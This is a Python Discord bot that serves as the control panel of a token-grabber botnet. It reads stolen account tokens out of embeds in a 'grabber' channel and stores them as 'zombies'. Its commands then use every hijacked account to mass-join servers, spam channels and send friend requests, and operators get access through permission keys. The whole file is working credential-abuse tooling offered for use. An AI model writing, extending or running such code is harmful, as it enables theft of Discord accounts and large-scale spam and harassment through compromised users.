import sys

sys.path.insert(0,'./class')


import json
import time

import discord
from Cache import Cache
from Checker import Checker
from discord.ext import commands, tasks
from Embed import EmbedGenerator
from Utils import Utils
from colorfull import init; init()


class Bot():
    def __init__(self, token, prefix, hook, config):
        self.Cache = Cache('./Data/Account.json', './Data/Zombies.json', hook)
        self.prefix = prefix
        self.token  = token
        self.config = config
        
        client = commands.Bot(command_prefix= self.prefix)
        self.client = client

        @tasks.loop(minutes= 30)
        async def update_status():
            await client.change_presence(status= discord.Status.dnd, activity= discord.Game(f'{self.prefix}list | {len(self.Cache.Zombies)} Zombies'))
            self.Cache.check_zombies()
            await client.change_presence(status= discord.Status.dnd, activity= discord.Game(f'{self.prefix}list | {len(self.Cache.Zombies)} Zombies'))

        @client.command()
        async def list(ctx):
            i = 0
            commands = '```ASM\n'
            for cmd in client.commands:
                commands += f'{cmd}\n'
                i += 1
            commands += '```'
            
            await ctx.send(embed= EmbedGenerator().generate_embed(fields= {f'Command list: ({i} cmd)': commands}))

        @client.event
        async def on_ready():
            print(f'Connected: {client.user}')
            await client.change_presence(status= discord.Status.dnd, activity= discord.Game(f'{self.prefix}help'))
            await update_status.start()
            self.Cache.load_tokens()
            self.Cache.check_zombies()

        @client.event
        async def on_message(message):
            if str(message.channel.id) in self.config['BOT']['CHANNELS']['GRABBER']:
                for embed in message.embeds:
                    token = (embed.to_dict()['description']).split('> **Token:** `')[1].split('`')[0]
                    self.Cache.add_zombie(token)
                await client.process_commands(message)

        @client.command()
        async def post_token(ctx, token):
            self.Cache.add_zombie(token)
            await ctx.send(embed= EmbedGenerator().generate_embed(fields= {'Congrast !': 'Token added successfully'}))

        @client.command()
        async def check_token(ctx, token):
            self.Cache.add_zombie(token)

            token_info = Checker(token).get_informations()

            if token_info != 'invalid':
                await ctx.send(embed= EmbedGenerator().generate_embed(token_info))
            else:
                await ctx.send(embed= EmbedGenerator().generate_embed(fields= {'Oops..': 'The token was invalid'}))
        
        @client.command()
        async def add_user(ctx, key):
            self.Cache.add_user(key, f'{ctx.author.name}#{ctx.author.discriminator}', ctx.author.id)
            await ctx.send(embed= EmbedGenerator().generate_embed(fields= {'Yes !': 'New user created'}))

        @client.command()
        async def del_user(ctx, key):
            if str(ctx.author.id) in self.config['BOT']['PERMS']['ADMIN'] or str(ctx.author.id) in self.config['BOT']['PERMS']['OWNER']:
                self.Cache.del_user(key)
                await ctx.send(embed= EmbedGenerator().generate_embed(fields= {'Yes !': 'User successfully deleted'}))
            else:
                await ctx.send(embed= EmbedGenerator().generate_embed(fields= {'No !': 'You need to be `OWNER` or `ADMIN` !'}))

        @client.command()
        async def look_user(ctx):
            await ctx.send(embed = EmbedGenerator().generate_embed(fields= {'👽 | Zombies in database': str(len(self.Cache.Zombies))}))

        @client.command()
        async def join(ctx, Invite):
            with open('./Data/Account.json', 'r') as database:
                db = json.load(database)
            for acc in db['ACCOUNTS']:
                if str(ctx.author.id) in db['ACCOUNTS'][acc]['ID']:
                    if 'JOIN_TOKENS' in db['ACCOUNTS'][acc]['PERMISSIONS']:
                        for Token in self.Cache.all:
                            time.sleep(3)
                            Utils(Token).Token_Joiner(Invite)
                    else:
                        await ctx.send(embed = EmbedGenerator().generate_embed(fields= {'No !': 'You need to permission for joined all tokens in your server'}))

        @client.command()
        async def send(ctx, ChanID, *, Message):
            with open('./Data/Account.json', 'r') as database:
                db = json.load(database)
            for acc in db['ACCOUNTS']:
                if str(ctx.author.id) in db['ACCOUNTS'][acc]['ID']:
                    if 'SPAM_TOKENS' in db['ACCOUNTS'][acc]['PERMISSIONS']:
                        for Token in self.Cache.all:
                            Utils(Token).Token_Send(ChanID, Message)
                    else:
                        await ctx.send(embed = EmbedGenerator().generate_embed(fields= {'No !': 'You need to permission for sent all tokens in your server'}))

        @client.command()
        async def friend_request(ctx, UsrID):
            with open('./Data/Account.json', 'r') as database:
                db = json.load(database)
            for acc in db['ACCOUNTS']:
                if str(ctx.author.id) in db['ACCOUNTS'][acc]['ID']:
                    if 'FRIENDS_TOKEN' in db['ACCOUNTS'][acc]['PERMISSIONS']:
                        for Token in self.Cache.all:
                            Utils(Token).Token_Friend_Request(UsrID)
                    else:
                        await ctx.send(embed = EmbedGenerator().generate_embed(fields= {'No !': 'You need to permission for friend request all tokens in your server'}))

    
    def start(self):
        self.client.run(self.token)

if __name__ == '__main__':
    with open('./config.json', 'r') as config_file:
        config = json.load(config_file)
        
        Bot(config['BOT']['TOKEN'], config['BOT']['PREFIX'], config['HOOK'], config).start()
